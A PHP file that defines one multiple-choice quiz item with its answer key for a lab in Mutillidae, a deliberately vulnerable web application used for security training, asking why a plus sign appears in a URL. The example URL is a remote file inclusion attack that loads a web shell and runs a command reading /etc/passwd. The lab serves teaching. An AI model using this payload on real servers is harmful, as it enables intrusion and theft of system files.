<?php
    $lLabNumber = 22;
    $lTitle = "Lab 22:  Insecure Direct Object Reference - Web Shell with Remote File Inclusion (RFI)";
    $lQuestion = "In the URL displayed below, what is the purpose of the plus (+) symbol that appears near the end.     http://mutillidae.local/index.php?page=http://127.0.0.1:8888/simple-web-shell.php&pCommand=cat+/etc/passwd";
    $lChoice_1 = "The plus symbol is part of the cat command. The full command is cat+.";
    $lChoice_2 = "The plus symbol will throw off any intrusion detection systems but ignored by all of the server-side systems.";
    $lChoice_3 = "The plus symbol tell the vulnerable server to run the command with admin privileges";
    $lChoice_4 = "The plus symbol routes the request through the default gateway";
    $lChoice_5 = "The plus symbol is the encoded character representing a space ' '. We have to encode the space character to prevent Apache web server from thinking the space marks the end of the URL.";
    $lCorrectAnswer = 5;

    require_once("labs/lab-template.inc");
?>